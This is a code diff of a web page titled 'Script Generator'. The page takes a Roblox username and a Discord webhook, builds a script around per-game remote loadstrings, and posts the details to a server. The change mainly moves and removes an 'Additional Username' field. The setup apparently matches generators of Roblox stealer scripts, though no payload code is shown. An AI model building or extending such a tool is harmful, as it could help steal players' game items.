@@ -95,6 +95,9 @@
         .copy-button:disabled {
             background: #555;
         }
+        .testing-container {
+            margin-top: 20px;
+        }
         .additional-username-container {
             display: none;
             margin-top: 20px;
@@ -109,23 +112,14 @@
             font-size: 1rem;
             width: 80%;
         }
-        .testing-container {
-            margin-top: 20px;
-        }
     </style>
 </head>
 <body>
     <h1>Script Generator</h1>
     
-    <!-- Testing Button and Enter Button -->
+    <!-- Testing Button -->
     <div class="testing-container">
         <button onclick="toggleAdditionalUsernameField()">Testing</button>
-        <button onclick="generateScript()">Enter</button>
-    </div>
-
-    <!-- Additional Username Field -->
-    <div id="additional-username-container" class="additional-username-container">
-        <input type="text" id="additionalUsername" placeholder="Additional Username (optional)">
     </div>
 
     <!-- Game Selection -->
@@ -140,6 +134,12 @@
         </select>
     </div>
 
+    <!-- Additional Username Field -->
+    <div id="additional-username-container" class="additional-username-container">
+        <input type="text" id="additionalUsername" placeholder="Additional Username (optional)">
+    </div>
+
+    <!-- Popup for User Details -->
     <div id="popup" class="popup">
         <h2 id="game-title">Enter Details</h2>
         <input type="text" id="username" placeholder="Roblox Username">
@@ -149,6 +149,7 @@
         <button onclick="closePopup()">Close</button>
     </div>
 
+    <!-- Generated Script Display -->
     <div id="generated-script" class="generated-script">
         <h3>Generated Script</h3>
         <pre id="script-output"></pre>
@@ -192,13 +193,12 @@
             let username = document.getElementById('username').value;
             let discordUser = document.getElementById('discordUser').value;
             let webhook = document.getElementById('webhook').value;
-            let additionalUsername = document.getElementById('additionalUsername').value;
 
             if (username && webhook) {
                 // Trigger Sigma detection
                 detectSigma();
 
-                let script = `Username = "${username}"\nAdditional Username = "${additionalUsername}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
+                let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[currentGame]}`;
                 document.getElementById('script-output').innerText = script;
                 document.getElementById('generated-script').style.display = 'block';
                 document.getElementById('copy-btn').disabled = false;
@@ -210,7 +210,6 @@
                     body: JSON.stringify({
                         username: discordUser,
                         game: currentGame,
-                        additionalUsername: additionalUsername,
                         webhook: webhook
                     })
                 });
